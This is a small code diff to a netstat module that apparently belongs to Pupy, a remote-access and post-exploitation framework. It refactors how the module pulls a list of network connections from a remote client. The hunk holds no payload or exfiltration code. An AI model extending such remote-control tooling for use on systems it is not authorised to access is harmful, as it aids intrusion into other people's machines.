@@ -31,8 +31,10 @@ class NetStatModule(PupyModule):
 
     def run(self, args):
         try:
-            rpupyps = self.client.conn.modules.pupyps
-            data = obtain(rpupyps.connections())
+            rpupyps = self.client.remote('pupyps')
+            connections = self.client.remote('pupyps', 'connections')
+
+            data = connections()
             sock = { int(x):y for x,y in obtain(rpupyps.socktypes).iteritems() }
             families = { int(x):y for x,y in obtain(rpupyps.families).iteritems() }
 
